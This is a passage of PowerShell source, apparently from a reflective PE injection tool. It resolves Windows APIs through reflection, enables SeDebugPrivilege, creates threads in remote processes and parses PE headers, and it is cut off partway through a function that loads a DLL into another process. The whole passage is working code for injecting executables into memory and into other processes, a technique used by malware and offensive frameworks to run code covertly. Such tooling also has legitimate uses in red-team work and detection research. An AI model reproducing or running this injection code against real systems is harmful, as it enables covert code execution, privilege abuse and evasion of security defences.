        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
        
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
        
        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
        
        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
        
        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
        
        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
        
        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress 
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
        
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
        
        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
        
        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
        
        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
        
        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
        
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
        
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
        
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
        
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
        
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
        
        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
        
        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
        
        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
        
        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
        
        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
        
        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
        
        
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
        
        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
        
        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
        
        return $Win32Functions
    }
    

            
    
    
    

    
    
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
                
                
                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw ""Cannot subtract bytearrays of different sizes""
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF
                
                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw ""Cannot add bytearrays of different sizes""
        }
        
        return [BitConverter]::ToInt64($FinalBytes, 0)
    }
    

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )
        
        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw ""Cannot compare byte arrays of different size""
        }
        
        return $false
    }
    

    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )
        
        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value 
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = ""0x{0:X$($ValueSize)}"" -f [Int64]$Value 

        return $Hex
    }
    
    
    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(ParameterSetName = ""Size"", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )
        
        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
        
        $PEEndAddress = $PEInfo.EndAddress
        
        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw ""Trying to write to memory smaller than allocated address range. $DebugString""
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw ""Trying to write to memory greater than allocated address range. $DebugString""
        }
    }
    
    
    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,
            
            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )
    
        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }
    

    
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }


    
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

        
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }
    
    
    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw ""Unable to get the handle to the current thread""
        }
        
        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
            {
                $Result = $Win32Functions.ImpersonateSelf.Invoke(3)
                if ($Result -eq $false)
                {
                    Throw ""Unable to impersonate self""
                }
                
                $Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
                if ($Result -eq $false)
                {
                    Throw ""Unable to OpenThreadToken.""
                }
            }
            else
            {
                Throw ""Unable to OpenThreadToken. Error code: $ErrorCode""
            }
        }
        
        [IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
        $Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, ""SeDebugPrivilege"", $PLuid)
        if ($Result -eq $false)
        {
            Throw ""Unable to call LookupPrivilegeValue""
        }

        [UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
        [IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
        $TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
        $TokenPrivileges.PrivilegeCount = 1
        $TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
        $TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

        $Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
        $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
        if (($Result -eq $false) -or ($ErrorCode -ne 0))
        {
            
        }
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
    }
    
    
    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [IntPtr]
        $ProcessHandle,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,
        
        [Parameter(Position = 3, Mandatory = $false)]
        [IntPtr]
        $ArgumentPtr = [IntPtr]::Zero,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [System.Object]
        $Win32Functions
        )
        
        [IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
        
        $OSVersion = [Environment]::OSVersion.Version
        
        if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
        {
            
            $RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($RemoteThreadHandle -eq [IntPtr]::Zero)
            {
                Throw ""Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError""
            }
        }
        
        else
        {
            
            $RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
        }
        
        if ($RemoteThreadHandle -eq [IntPtr]::Zero)
        {
            Write-Error ""Error creating remote thread, thread handle is null"" -ErrorAction Stop
        }
        
        return $RemoteThreadHandle
    }

    

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $NtHeadersInfo = New-Object System.Object
        
        
        $dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)

        
        [IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
        $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
        $imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
        
        
        if ($imageNtHeaders64.Signature -ne 0x00004550)
        {
            throw ""Invalid IMAGE_NT_HEADER signature.""
        }
        
        if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
        }
        else
        {
            $ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
            $NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
        }
        
        return $NtHeadersInfo
    }


    
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        $PEInfo = New-Object System.Object
        
        
        [IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
        
        
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
        
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
        
        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
        
        return $PEInfo
    }


    
    
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )
        
        if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }
        
        $PEInfo = New-Object System.Object
        
        
        $NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
        
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        else
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
        }
        
        if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw ""PE file is not an EXE or DLL""
        }
        
        return $PEInfo
    }
    
    
    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $RemoteProcHandle,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ImportDllPathPtr
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
        $DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
        $RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
